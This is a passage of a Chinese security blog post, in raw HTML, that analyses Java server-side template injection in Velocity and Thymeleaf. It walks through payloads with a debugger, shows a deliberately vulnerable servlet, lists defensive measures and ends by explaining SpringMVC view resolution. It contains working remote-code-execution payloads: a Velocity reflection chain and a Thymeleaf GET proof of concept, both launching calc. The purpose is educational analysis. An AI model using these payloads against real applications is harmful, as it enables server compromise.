class="hljs-string">&quot;#set($e=/&quot;</span>e/<span class="hljs-string">&quot;)/n&quot;</span> +<br>                <span class="hljs-string">&quot;$e.getClass().forName(/&quot;</span>java.lang.Runtime/<span class="hljs-string">&quot;).getMethod(/&quot;</span>getRuntime/<span class="hljs-string">&quot;,null).invoke(null,null).exec(/&quot;</span>Calc/<span class="hljs-string">&quot;)&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br><br>        Velocity.init();<br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// 输出velocity渲染结果</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#set($e=&quot;e&quot;)：定义了一个Velocity变量$e，并赋值为字符串&quot;e&quot;。</span><br><span class="hljs-variable">$e</span>.getClass()：获取变量<span class="hljs-variable">$e</span>的运行时类。<br>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)：通过反射加载java.lang.Runtime类。<br>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, null)：使用反射获取Runtime类的getRuntime方法，该方法返回Runtime类的实例。<br>.invoke(null, null)：使用反射调用getRuntime方法，参数为null，因为该方法不接受任何参数。这将返回Runtime类的实例。<br>.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;open -a calculator&quot;</span>)：使用Runtime类的实例的<span class="hljs-built_in">exec</span>方法执行操作系统命令。在这里，命令是open -a calculator，即打开Mac的计算器<br>windows一般使用Calc即可<br></code></pre></td></tr></table></figure><p>运行主程序，看到计算器成功弹出</p><p><img src="/img/ssti(java)/ssti22.png"></p><p>根据测试程序，首先会进入Velocity类的init方法，在此处下断点</p><p>在该方法中，会调用RuntimeSingleton类的init方法，这个方法主要是对模板引擎的初始化，比如设置属性、初始化日志系统、资源管理器、指令等。</p><p><img src="/img/ssti(java)/ssti23.png"></p><p>接下来回到主程序中，实例化VelocityContext，并将三对键值对put进去，之后调用Velocity类的evaluate方法，此时templateString的值为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hello, <span class="hljs-comment">#set($e=&quot;e&quot;)</span><br><span class="hljs-variable">$e</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;Calc&quot;</span>) | Full name: <span class="hljs-variable">$name</span>, phone: <span class="hljs-variable">$phone</span>, email: <span class="hljs-variable">$email</span><br></code></pre></td></tr></table></figure><p>下一步进入了RuntimeInstance的evaluate方法-&gt;进入重载的evaluate方法</p><p>这个方法会调用RuntimeInstance类的parse方法进行解析。</p><p>经过两重调用来到org&#x2F;apache&#x2F;velocity&#x2F;runtime&#x2F;parser&#x2F;Parser.class的parse方法。</p><p>完成模板文件的parse工作后，生成ast语法树结构</p><p><img src="/img/ssti(java)/ssti24.png"></p><p>当执行来到engine.evaluate；我们跟进去，直接就看到了RuntimeInstance.evaluate；最后会调用 render 方法将解析后的内容渲染到 writer 中，并返回渲染结果</p><p><img src="/img/ssti(java)/ssti25.png"></p><p>跟进到render；这里主要实现的是将解析后的节点树渲染到指定的写入器中。</p><p>首先在729行调用 nodeTree.init对节点树进行初始化。接着调用 nodeTree.render将节点树渲染到写入器中。</p><p><img src="/img/ssti(java)/ssti26.png"></p><p>跟进去到render。这里主要实现的是获取节点树的子节点数量，并使用 for 循环遍历所有子节点。通过 jjtGetChild(i) 方法获取第 i 个子节点，并调用其 render 方法来渲染子节点内容到指定的写入器中。</p><p><img src="/img/ssti(java)/ssti27.png"></p><p>继续跟进jjtGetChild(i).render；最后来到了ASTReference.render.</p><p>先判断this.referenceType 的值是否为 4；然后判断this.escaped 的值为false</p><p><img src="/img/ssti(java)/ssti28.png"></p><p>继续跟进来之后，就到了ASTMethod.execute。这里接受一个 Object 对象和一个 InternalContextAdapter 对象作为参数。我们直接看到</p><p>调用 method.invoke(o, params) 方法执行方法调用，并将结果存储在 obj 变量中。</p><p><img src="/img/ssti(java)/ssti30.png"></p><p>跟进去查看invoke；判断方法是否为可变参数方法，如果是就进行一系列操作。最后调用doInvoke方法执行实际的方法调用，并返回结果。</p><p>而doInvoke方法，正是下面的doInvoke方法，可以看到getClass方法已经作为参数被传入</p><p><img src="/img/ssti(java)/ssti31.png"></p><p>最后调用了Java反射里面的invoke，进行执行</p><p><img src="/img/ssti(java)/ssti32.png"></p><h5 id="merge触发"><a href="#merge触发" class="headerlink" title="merge触发"></a>merge触发</h5><p>merge方法使用VelocityEngine的getTemplate方法获取指定的模板文件，然后使用merge方法将模板和上下文数据合并为最终结果。</p><p>创建一个servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.garck3h.controller;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.VelocityEngine;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.RuntimeConstants;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VelocityInjectionController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/merge&quot;)</span><br>   <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">merge</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 从请求参数中获取模板值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;template&quot;</span>);<br><br>        <span class="hljs-comment">// 从classpath中加载Velocity模板</span><br>        <span class="hljs-type">VelocityEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityEngine</span>();<br>        engine.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class="hljs-string">&quot;classpath&quot;</span>);<br>        engine.setProperty(<span class="hljs-string">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());<br>        engine.init();<br><br>        <span class="hljs-comment">// 动态创建Velocity上下文并设置参数</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        context.put(<span class="hljs-string">&quot;params&quot;</span>, request.getParameterMap());<br><br>        <span class="hljs-comment">// 进行模板合并</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> engine.getTemplate(template);<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        tpl.merge(context, sw);<br><br>        <span class="hljs-comment">// 创建ModelAndView对象，指定视图名为&quot;hello&quot;</span><br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-comment">// 将模板合并的结果作为属性添加到ModelAndView对象中</span><br>        modelAndView.addObject(<span class="hljs-string">&quot;hello&quot;</span>, sw.toString());<br>        <span class="hljs-comment">// 返回ModelAndView对象</span><br>        <span class="hljs-keyword">return</span> modelAndView;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模板能够插入语句时，传入payload，可以正常执行</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><ul><li>因为Spring框架版本的问题，高版本不能直接整合Velocity模板，一直报错</li><li>Velocity模板目前也逐渐被其它模板引擎替代</li></ul><h2 id="Thymeleaf-SSTI"><a href="#Thymeleaf-SSTI" class="headerlink" title="Thymeleaf SSTI"></a>Thymeleaf SSTI</h2><ul><li>Thymeleaf是目前最流行的模板引擎</li></ul><h3 id="Thymeleaf语法"><a href="#Thymeleaf语法" class="headerlink" title="Thymeleaf语法"></a>Thymeleaf语法</h3><p>Thymeleaf 表达式可以有以下类型：</p><ul><li><code>$&#123;...&#125;</code>：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行</li><li><code>*&#123;...&#125;</code>: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。</li><li><code>#&#123;...&#125;</code>: Message (i18n) 表达式 —— 允许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</li><li><code>@&#123;...&#125;</code>: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL&#x2F;路径（URL重写）。</li><li><code>~&#123;...&#125;</code>：片段表达式 —— <strong>Thymeleaf 3.x 版本新增的内容</strong>，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等</li></ul><p>实际上，Thymeleaf 出现 SSTI 问题的主要原因也正是因为这个片段表达式，我们知道片段表达式语法如下：</p><ul><li><strong><code>~&#123;templatename::selector&#125;</code></strong>，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code></li></ul><p>如有一个 html 文件的代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;banquan&quot;</span>&gt;</span> <span class="hljs-symbol">&amp;copy;</span> 2021 ThreeDream yyds<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后在另一template中可以通过片段表达式引用该片段：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;footer :: banquan&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>th:insert</code>和<code>th:replace:</code>插入片段是比较常见的用法</p><ol><li><code>~&#123;templatename&#125;</code>，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li></ol><p>这个也比较好理解，不做详细举例</p><ol start="2"><li><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li></ol><p>在这里，<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等。</p><ol start="3"><li><strong>当<code>~&#123;&#125;</code>片段表达式中出现<code>::</code>，那么 <code>::</code>后需要有值（也就是<code>selector</code>）</strong></li></ol><h3 id="Thymeleaf-SSTI注入漏洞"><a href="#Thymeleaf-SSTI注入漏洞" class="headerlink" title="Thymeleaf SSTI注入漏洞"></a>Thymeleaf SSTI注入漏洞</h3><h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>只有3.x版本的Thymeleaf 才会受到影响，因为在2.x 中<code>renderFragment</code>的核心处理方法是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderFragment</span><span class="hljs-params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br><br>                <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> viewTemplateEngine.getConfiguration();<br>                <span class="hljs-type">ProcessingContext</span> <span class="hljs-variable">processingContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessingContext</span>(context);<br>                templateCharacterEncoding = getStandardDialectPrefix(configuration);<br>                <span class="hljs-type">StandardFragment</span> <span class="hljs-variable">fragment</span> <span class="hljs-operator">=</span> StandardFragmentProcessor.computeStandardFragmentSpec(configuration, processingContext, viewTemplateName, templateCharacterEncoding, <span class="hljs-string">&quot;fragment&quot;</span>);<br>                <span class="hljs-keyword">if</span> (fragment == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <br>        ...<br></code></pre></td></tr></table></figure><p>并没有3.x 版本中对于片段表达式（<code>~&#123;</code>）的处理，也因此不会造成 SSTI 漏洞，以下是 SpringBoot 默认引用的 thymeleaf 版本</p><blockquote><p>spring boot:1.5.1.RELEASE spring-boot-starter-thymeleaf:2.1.5<br>spring boot:2.0.0.RELEASE spring-boot-starter-thymeleaf:3.0.9<br>spring boot:2.2.0.RELEASE spring-boot-starter-thymeleaf:3.0.11</p></blockquote><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>主要参考：<a href="https://xz.aliyun.com/news/9962">Thymeleaf SSTI漏洞分析-先知社区 (aliyun.com)</a></p><p>这里直接使用<a href="https://github.com/veracode-research/spring-view-manipulation">veracode-research&#x2F;spring-view-manipulation(github.com)</a>项目来做复现</p><p>漏洞代码</p><p>此控制器原本用于更改页面语言</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p>运行程序后顺利弹出计算器</p><p><img src="/img/ssti(java)/ssti33.png"></p><h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>参考：<a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></p><p>此漏洞同样被触发在模板视图渲染时</p><p>通过前两个对模板的视图解析与渲染代码分析，我们可以看到开始渲染调用的是render方法，Velocity调用<code>VelocityView#render</code>渲染，FreeMarker调用&#96;&#96;FreeMarker#render<code>渲染，同样Thymeleaf调用</code>ThymleafView#render&#96;渲染。</p><p><code>render</code>方法中又通过调用<code>renderFragment</code>完成实际的渲染工作。</p><p>在这里详细分析Thymeleaf的渲染工作</p><p>createView() 首先根据视图名创建对应的View</p><p>之后开始渲染，如果此处是 FreeMarker，就会去 <code>FreeMarkerView.render()</code>，如果是 Velocity，就会去 <code>VelocityView.render()</code>，我们此处是 Thymeleaf，会去到 <code>ThymeleafView.render()</code>，跟进。</p><p>跟进 <code>renderFragment()</code> 方法。在第 100 行，判断 <code>getTemplateName</code> 当中是否存在 <code>::</code> 这一字符，如果不存在就当作是一个普通的模板，直接赋值给 <code>templateName</code>，并清空 <code>markupSelectors</code>。</p><p>所以payload末尾需要加::，并且在前面介绍~{}语法时提到：：后是需要有值(也就是<code>selector</code>)，所以末尾是.x</p><p><img src="/img/ssti(java)/ssti47.png"></p><p>继续往下走，第 108 行，调用了 <code>(FragmentExpression)parser.parseExpression()</code>，对我们输入的这一串字符进行了处理。</p><p><img src="/img/ssti(java)/ssti48.png"></p><p><img src="/img/ssti(java)/ssti49.png"></p><p>继续跟进 <code>StandardExpressionPreprocessor.preprocess()</code></p><p>复制出了比较关键的一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> String <span class="hljs-title function_">preprocess</span><span class="hljs-params">(IExpressionContext context, String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input.indexOf(<span class="hljs-number">95</span>) == -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> input;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">IStandardExpressionParser</span> <span class="hljs-variable">expressionParser</span> <span class="hljs-operator">=</span> StandardExpressions.getExpressionParser(context.getConfiguration());<br>            <span class="hljs-keyword">if</span> (!(expressionParser <span class="hljs-keyword">instanceof</span> StandardExpressionParser)) &#123;<br>                <span class="hljs-keyword">return</span> input;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> PREPROCESS_EVAL_PATTERN.matcher(input);<br>                <span class="hljs-keyword">if</span> (!matcher.find()) &#123;<br>                    <span class="hljs-keyword">return</span> checkPreprocessingMarkUnescaping(input);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">strBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(input.length() + <span class="hljs-number">24</span>);<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">curr</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>先判断，input 里面是否有存在 <code>_</code> 字符，如果不存在则直接返回，不做解析处理。</p><p>接着，调用 <code>PREPROCESS_EVAL_PATTERN.matcher(input);</code>，进行正则提取，这里提取的是 <code>_</code> 中间的内容。</p><p>提取后获取到的内容是 <code>$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;Calc&quot;).getInputStream()).next()&#125;</code></p><p>此语句是被当作SpEL表达式执行的</p><p>因此 POC 中我们要构造形如<code>__xx__</code>的SpEL表达式（SpEL相关的知识点可以参考此文：<a href="https://paper.seebug.org/1694/">SPEL 表达式注入漏洞深入分析</a>），即表达式要为：<code>__$&#123;xxxxx&#125;__</code> 这种形式</p><p>因此，最终 POC 的形式就为：<code>__$&#123;xxxx&#125;__::.x</code></p><p>继续往下走，到了 <code>expression.execute()</code>，也就是命令执行的地方，语句就变成了</p><p><img src="/img/ssti(java)/ssti50.png"></p><p>至此分析过程结束。</p><h3 id="Thymeleaf-SSTI-Bypass"><a href="#Thymeleaf-SSTI-Bypass" class="headerlink" title="Thymeleaf SSTI Bypass"></a>Thymeleaf SSTI Bypass</h3><p>详情请见：<a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI 分析以及最新版修复的 Bypass - Panda | 热爱安全的理想少年 (cnpanda.net)</a></p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li>配置<code>@ResponseBody</code>或者<code>@RestController</code>，经以上注解后不会进行View解析而是直接返回。</li><li>在方法参数中加上 <code>HttpServletResponse</code>参数 ，此时spring会认为已经处理了response响应而不再进行视图解析。</li><li>在返回值前面加上 “<code>redirect:</code>“——经<code>RedirectView</code>处理。</li></ol><h2 id="SpringMVC-视图解析过程分析"><a href="#SpringMVC-视图解析过程分析" class="headerlink" title="SpringMVC 视图解析过程分析"></a>SpringMVC 视图解析过程分析</h2><p>在controller漏洞代码处下断点，可以看到若有完整的MVC框架，经过的调用栈都是相同的</p><p><img src="/img/ssti(java)/ssti34.png"></p><p><img src="/img/ssti(java)/ssti35.png"></p><p>所以以Thymeleaf为例尝试分析一下SpringMVC 视图解析过程</p><p>此处其实是涉及到的后端知识较多</p><p>参考：<a href="https://segmentfault.com/a/1190000021848063#item-2-4">spring-mvc - 深入源码分析SpringMVC执行过程 - 后端技术社区 - SegmentFault 思否</a></p><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>首先，让我们从 Spring MVC 的四大组件:<strong>前端控制器（DispatcherServlet）、处理器映射器（HandlerMapping）、处理器适配器（HandlerAdapter）以及视图解析器（ViewResolver）</strong> 的角度来看一下 Spring MVC 对用户请求的处理过程，过程如下图所示:</p><p><img src="https://img-blog.csdnimg.cn/20200221001135320.png"></p><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><ol><li>用户请求发送到<strong>前端控制器 DispatcherServlet</strong>。</li><li>前端控制器 DispatcherServlet 接收到请求后，DispatcherServlet 会使用 HandlerMapping 来处理，<strong>HandlerMapping 会查找到具体进行处理请求的 Handler 对象</strong>。</li><li>HandlerMapping 找到对应的 Handler 之后，并不是返回一个 Handler 原始对象，而是一个 Handler 执行链（HandlerExecutionChain），在这个执行链中包括了拦截器和处理请求的 Handler。HandlerMapping 返回一个执行链给 DispatcherServlet。</li><li>DispatcherServlet 接收到执行链之后，会<strong>调用 Handler 适配器去执行 Handler</strong>。</li><li>Handler 适配器执行完成 Handler（也就是 Controller）之后会得到一个 ModelAndView，并返回给 DispatcherServlet。</li><li>DispatcherServlet 接收到 HandlerAdapter 返回的 ModelAndView 之后，会根据其中的视图名调用 ViewResolver。</li><li><strong>ViewResolver 根据逻辑视图名解析成一个真正的 View 视图</strong>，并返回给 DispatcherServlet。</li><li>DispatcherServlet 接收到视图之后，会根据上面的 ModelAndView 中的 model 来进行视图中数据的填充，也就是所谓的<strong>视图渲染</strong>。</li><li>渲染完成之后，DispatcherServlet 就可以将结果返回给用户了。</li></ol><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>首先当我们访问页面的时候，将会把请求发送到<strong>前端控制器 DispatcherServlet</strong>，DispatcherServlet 是一个 Servlet，我们知道在 Servlet 在处理一个请求的时候会交给 service 方法进行处理，这里也不例外，DispatcherServlet 继承了 FrameworkServlet，首先进入 FrameworkServlet 的 <strong>service</strong> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-comment">// 请求方法</span><br>    <span class="hljs-type">HttpMethod</span> <span class="hljs-variable">httpMethod</span> <span class="hljs-operator">=</span> HttpMethod.resolve(request.getMethod());<br>    <span class="hljs-comment">// 若方法为 PATCH 方法或为空则单独处理</span><br>    <span class="hljs-keyword">if</span> (httpMethod == HttpMethod.PATCH || httpMethod == <span class="hljs-literal">null</span>) &#123;<br>        processRequest(request, response);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 其他的请求类型的方法经由父类，也就是 HttpServlet 处理</span><br>        <span class="hljs-built_in">super</span>.service(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>HttpServlet 中会根据请求类型的不同分别调用 doGet 或者 doPost 等方法，FrameworkServlet 中已经重写了这些方法，在这些方法中会调用 processRequest 进行处理，在 processRequest 中会调用 <strong>doService</strong> 方法，这个 doService 方法就是在 DispatcherServlet 中实现的。下面就看下 DispatcherServlet 中的 doService 方法的实现。</p><h4 id="DispatcherServlet-收到请求"><a href="#DispatcherServlet-收到请求" class="headerlink" title="DispatcherServlet 收到请求"></a>DispatcherServlet 收到请求</h4><p>在doService处下一个断点开始调试</p><p>看到417行调用了doDispatch 方法</p><p>首先会获取当前请求的 <strong>Handler 执行链</strong>，然后找到合适的 <strong>HandlerAdapter</strong>（此处为 RequestMappingHandlerAdapter），接着调用 RequestMappingHandlerAdapter 的 <strong>handle</strong> 方法，如下为 doDispatch 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 